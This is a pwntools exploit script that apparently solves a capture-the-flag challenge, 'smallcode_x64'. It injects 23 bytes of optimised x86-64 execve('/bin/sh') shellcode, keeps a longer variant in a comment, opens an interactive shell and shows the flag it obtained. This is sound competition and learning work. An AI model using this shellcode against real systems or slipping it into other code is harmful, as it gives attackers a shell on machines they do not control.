from pwn import *

HOST = args.HOST or '192.168.20.1'
PORT = int(args.PORT or 5280+3)
EXE_FILENAME = '../smallcode_x64'

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}

def start():
    if args.REMOTE:
        return remote(HOST,PORT)
    return process(argv=argv, env=envp)

io = start()
io.recvuntil(b'memory).')

# to see how much long is the pwntools shellcraft
# print(disasm(bytes(shellcraft.sh(), "UTF-8")))

# optimized: 23 bytes + terminator
io.sendline(b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05')

# not optimized: 24 bytes + terminator
# io.sendline(b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb8\x3b\x00\x00\x00\x99\x0f\x05')

io.interactive()

'''
$ cat flag.txt
BASC{0pT1miZin9_5h3llc0d3_iS_n0T_s0_H4rD}
'''
